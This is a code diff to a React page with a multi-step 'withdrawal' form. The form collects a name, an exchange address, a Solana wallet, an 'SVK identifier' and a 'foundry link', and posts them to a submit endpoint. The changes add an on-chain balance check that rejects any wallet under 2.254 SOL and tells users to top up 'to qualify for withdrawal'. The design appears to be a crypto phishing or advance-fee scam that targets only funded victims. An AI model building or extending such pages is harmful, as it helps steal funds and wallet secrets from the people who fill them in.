@@ -301,15 +301,70 @@ function StepName({ onNext, onBack }) {
   );
 }
 
-function StepWallet({ onNext, onBack }) {
+function StepExchangeWallet({ onNext, onBack }) {
   const [wallet, setWallet] = useState('');
   const [error, setError] = useState('');
   const submit = () => {
-    if (!wallet.trim() || !/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(wallet.trim())) {
-      setError('Invalid Solana address format'); return;
-    }
-    onNext({ walletAddress: wallet.trim() });
+    if (!wallet.trim()) { setError('Exchange wallet address is required'); return; }
+    onNext({ exchangeWallet: wallet.trim() });
   };
+  return (
+    <div style={{ padding: '22px 28px 28px' }}>
+      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
+        <span style={{ fontSize: 20 }}>⬡</span>
+        <div>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1 }}>EXCHANGE WALLET</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>CEX · Withdrawal Address</div>
+        </div>
+      </div>
+      <FieldLabel>EXCHANGE WALLET ADDRESS</FieldLabel>
+      <CryptoInput placeholder="Enter your exchange wallet address..." value={wallet}
+        onChange={e => { setWallet(e.target.value); setError(''); }}
+        error={!!error} autoFocus maxLength={100}
+        onKeyDown={e => e.key === 'Enter' && submit()}
+      />
+      {error && <ErrMsg msg={error} />}
+      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>⬡ Binance, Coinbase, Kraken or any CEX address</p>
+      <div style={{ display: 'flex', gap: 10 }}>
+        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
+      </div>
+    </div>
+  );
+}
+
+function StepWallet({ onNext, onBack }) {
+  const [wallet, setWallet] = useState('');
+  const [error, setError] = useState('');
+  const [checking, setChecking] = useState(false);
+  const [balance, setBalance] = useState(null);
+
+  const checkBalanceAndNext = async () => {
+    const addr = wallet.trim();
+    if (!addr) { setError('Wallet address is required'); return; }
+    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) { setError('Invalid Solana address format'); return; }
+    setChecking(true); setBalance(null); setError('');
+    try {
+      const resp = await fetch('https://api.mainnet-beta.solana.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [addr, { commitment: 'confirmed' }] }),
+      });
+      const data = await resp.json();
+      if (data.error) throw new Error(data.error.message);
+      const solBalance = data.result.value / 1_000_000_000;
+      setBalance(solBalance);
+      if (solBalance < 2.254) {
+        setError(`Insufficient balance: ${solBalance.toFixed(4)} SOL detected. Minimum required is 2.254 SOL to qualify for withdrawal.`);
+        setChecking(false); return;
+      }
+      setChecking(false);
+      onNext({ walletAddress: addr, solBalance: solBalance.toFixed(4) });
+    } catch (e) {
+      setChecking(false);
+      setError('Could not verify balance. Please check your address and try again.');
+    }
+  };
+
   return (
     <div style={{ padding: '22px 28px 28px' }}>
       <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
@@ -319,15 +374,36 @@ function StepWallet({ onNext, onBack }) {
           <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>SPL · Mainnet Beta</div>
         </div>
       </div>
-      <FieldLabel>WALLET ADDRESS</FieldLabel>
+      <FieldLabel>SOLANA WALLET ADDRESS</FieldLabel>
       <CryptoInput placeholder="e.g. 7wM6Tyh...tUgV" value={wallet}
-        onChange={e => { setWallet(e.target.value); setError(''); }}
+        onChange={e => { setWallet(e.target.value); setError(''); setBalance(null); }}
         error={!!error} autoFocus maxLength={44}
+        onKeyDown={e => e.key === 'Enter' && checkBalanceAndNext()}
       />
-      {error && <ErrMsg msg={error} />}
-      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>◎ Only Solana addresses accepted</p>
+      {checking && (
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.2)' }}>
+          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#9945ff', animation: 'blink 0.8s ease-in-out infinite' }} />
+          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(153,69,255,.8)' }}>Verifying wallet balance on Solana mainnet...</span>
+        </div>
+      )}
+      {error && (
+        <div style={{ marginTop: 8, padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)' }}>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545', lineHeight: 1.6 }}>⚠ {error}</div>
+          {error.includes('Insufficient') && (
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>◎ Min required: 2.254 SOL · Please top up your wallet and try again.</div>
+          )}
+        </div>
+      )}
+      {balance !== null && balance >= 2.254 && (
+        <div style={{ marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(20,241,149,.06)', border: '1px solid rgba(20,241,149,.25)', display: 'flex', alignItems: 'center', gap: 8 }}>
+          <span style={{ color: '#14f195', fontSize: 14 }}>✓</span>
+          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195' }}>Balance verified: {balance.toFixed(4)} SOL</span>
+        </div>
+      )}
+      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 8, marginBottom: 14 }}>◎ Minimum 2.254 SOL required · Balance verified on-chain</p>
       <div style={{ display: 'flex', gap: 10 }}>
-        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
+        <BtnBack onClick={onBack} />
+        <BtnNext onClick={checkBalanceAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</BtnNext>
       </div>
     </div>
   );
@@ -407,6 +483,7 @@ function StepSuccess() {
 const STEPS_CONFIG = [
   { title: 'AUTHENTICATE', sub: 'Enter your access code to continue' },
   { title: 'YOUR NAME', sub: 'Enter your full name for verification' },
+  { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
   { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
   { title: 'SVK', sub: 'Enter your SVK identifier' },
   { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
@@ -432,13 +509,13 @@ export default function Home() {
     try {
       await fetch('/api/submit', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: payload.name, walletAddress: payload.walletAddress, svk: payload.svk, foundryLink: payload.foundryLink }),
+        body: JSON.stringify({ name: payload.name, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, svk: payload.svk, foundryLink: payload.foundryLink }),
       });
     } catch {}
-    setStep(5);
+    setStep(6);
   };
 
-  const isSuccess = step === 5;
+  const isSuccess = step === 6;
   const stepInfo = STEPS_CONFIG[step] || {};
 
   return (
@@ -549,10 +626,11 @@ export default function Home() {
 
             {step === 0 && <StepAccess onNext={() => next()} />}
             {step === 1 && <StepName onNext={next} onBack={back} />}
-            {step === 2 && <StepWallet onNext={next} onBack={back} />}
-            {step === 3 && <StepSVK onNext={next} onBack={back} />}
-            {step === 4 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
-            {step === 5 && <StepSuccess />}
+            {step === 2 && <StepExchangeWallet onNext={next} onBack={back} />}
+            {step === 3 && <StepWallet onNext={next} onBack={back} />}
+            {step === 4 && <StepSVK onNext={next} onBack={back} />}
+            {step === 5 && <StepFoundry onNext={handleFoundrySubmit} onBack={back} />}
+            {step === 6 && <StepSuccess />}
           </div>
         </div>
       )}
